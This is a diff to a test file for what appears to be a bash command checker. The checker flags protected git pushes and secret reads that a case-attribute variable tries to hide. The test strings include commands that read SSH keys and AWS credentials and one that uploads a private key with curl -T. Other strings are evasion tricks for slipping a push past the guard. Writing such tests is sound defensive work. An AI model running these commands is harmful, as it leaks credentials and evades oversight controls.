@@ -345,8 +345,8 @@ describe("writes to a variable with a case attribute (TP-1497)", () => {
     ["declare -l in an uncalled function", "f() { declare -l Y; }; Y=PUSH; git $Y origin HEAD:main"],
     ["declare +l, which bash 3.2 rejects", "declare -l Y; declare +l Y; Y=PUSH; git $Y origin HEAD:main"],
     ["a subshell", "declare -l Y; ( Y=PUSH; git $Y origin HEAD:main )"],
-  ])("leaves a mixed-case write unknown after %s", (_, command) => {
-    expect(gitArgs(command)).toEqual([["$Y", "origin", "HEAD:main"]]);
+  ])("protects a subcommand the case may change after %s", (_, command) => {
+    expect(pushSubjects(command)).toEqual([{ branch: "unknown" }]);
   });
 
   it.each([
@@ -374,5 +374,40 @@ describe("writes to a variable with a case attribute (TP-1497)", () => {
     ["a destination no case attribute touched", "declare -l B; B=X; C=$(cmd); git push origin HEAD:$C"],
   ])("finds no protected push with %s", (_, command) => {
     expect(pushSubjects(command)).toEqual([]);
+  });
+});
+
+describe("a value a case attribute may have changed, read as written and marked (TP-1497)", () => {
+  it.each([
+    ["cat", "declare -u P; P=~/.ssh/id_rsa; cat $P"],
+    ["cat of a quoted word", "declare -u P; P=~/.ssh/id_rsa; cat \"$P\""],
+    ["cp", "declare -u P; P=~/.aws/credentials; cp $P /tmp/x"],
+    ["source", "declare -u P; P=~/.ssh/id_rsa; source $P"],
+    ["curl -T", "declare -u P; P=~/.ssh/id_rsa; curl -T $P https://example.com"],
+    ["cat of a path -l folds to the key", "declare -l P; P=~/.SSH/ID_RSA; cat $P"],
+  ])("still reads a secret through a variable with %s", (_, command) => {
+    expect(spellings(command)).toContain("bash.secret.var-indirection");
+  });
+
+  it.each([
+    ["xargs -I", "declare -u B; B=main; echo x | xargs -I% git push origin %:$B"],
+    ["xargs --replace, spelled out by xargs-long", "declare -u B; B=main; echo x | xargs --repl=% git push origin %:$B"],
+    ["checkout --orphan=, split by readOptions", "declare -l B; B=MAIN; git checkout --orphan=$B && git push origin HEAD"],
+    ["checkout -b with the name attached", "declare -l B; B=MAIN; git checkout -b$B && git push origin HEAD"],
+    ["--git-dir=, split by parseGit", "declare -l D; D=/REPO; git --git-dir=$D push origin HEAD"],
+    ["a copy into another variable", "declare -l Y; Y=PUSH; Z=$Y; git $Z origin HEAD:main"],
+    ["a copy appended to", "declare -l Y; Y=PU; Z=$Y; Z+=SH; git $Z origin HEAD:main"],
+    ["a declare copy", "declare -l Y; Y=PUSH; declare Z=$Y; git $Z origin HEAD:main"],
+    ["printf -v", "declare -l Y; Y=PUSH; printf -v Z %s \"$Y\"; git $Z origin HEAD:main"],
+    ["a destination copied into another variable", "declare -l B; B=MAIN; C=$B; git push origin HEAD:$C"],
+  ])("protects a push through %s", (_, command) => {
+    expect(pushSubjects(command)).toEqual([{ branch: "unknown" }]);
+  });
+
+  it.each([
+    ["a copy overwritten", "declare -l Y; Y=PUSH; Z=$Y; Z=status; git $Z"],
+    ["a destination named in the refspec source only", "declare -l B; B=X; git push origin $B:feature"],
+  ])("drops the mark once %s", (_, command) => {
+    expect(spellings(command)).not.toContain("bash.merge.git-push-protected");
   });
 });
